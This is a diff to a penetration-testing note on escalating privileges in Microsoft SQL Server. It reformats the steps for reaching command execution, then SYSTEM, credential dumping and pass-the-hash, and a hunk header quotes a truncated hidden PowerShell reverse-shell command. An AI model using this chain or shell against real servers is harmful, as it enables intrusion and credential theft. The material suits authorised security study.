@@ -12,9 +12,17 @@ leads_to:
 
 ## Prerequisites
 
-A SQL Server login (sa, domain user, or SQL auth). Port 1433 reachable. Connected via impacket-mssqlclient or SSMS. Even a low-privilege login can escalate if impersonation or linked servers are misconfigured.
+- A SQL Server login (sa, domain user, or SQL auth)
 
-MSSQL privesc has three distinct paths: (1) enable `xp_cmdshell` if you have sysadmin, (2) impersonate a sysadmin login via `EXECUTE AS LOGIN`, (3) hop across linked servers to reach a sysadmin login on another instance. All three paths lead to OS command execution as the SQL service account, which almost always has `SeImpersonatePrivilege` → GodPotato → SYSTEM.
+- Port 1433 reachable
+
+- Connected via impacket-mssqlclient or SSMS
+
+- Even a low-privilege login can escalate if impersonation or linked servers are misconfigured
+
+- Three paths: enable `xp_cmdshell` (if sysadmin), impersonate a sysadmin login via `EXECUTE AS LOGIN`, or hop across linked servers to reach a sysadmin login on another instance
+
+- All three lead to OS command execution as the SQL service account, which almost always has `SeImpersonatePrivilege` → GodPotato → SYSTEM
 
 ## Quick Win
 
@@ -99,4 +107,8 @@ EXEC xp_cmdshell 'powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPCli
 
 ## Leads To
 
-`whoami` shows service account → check `whoami /priv` → SeImpersonatePrivilege almost guaranteed → token-impersonation → GodPotato → SYSTEM. SYSTEM shell → dump SAM + LSA → pass-the-hash laterally. xp_dirtree hash captured → crack or relay for additional access.
+- `whoami` shows service account → check `whoami /priv` → SeImpersonatePrivilege almost guaranteed → `token-impersonation` → GodPotato → SYSTEM
+
+- SYSTEM shell → dump SAM + LSA → pass-the-hash laterally
+
+- xp_dirtree hash captured → crack or relay for additional access
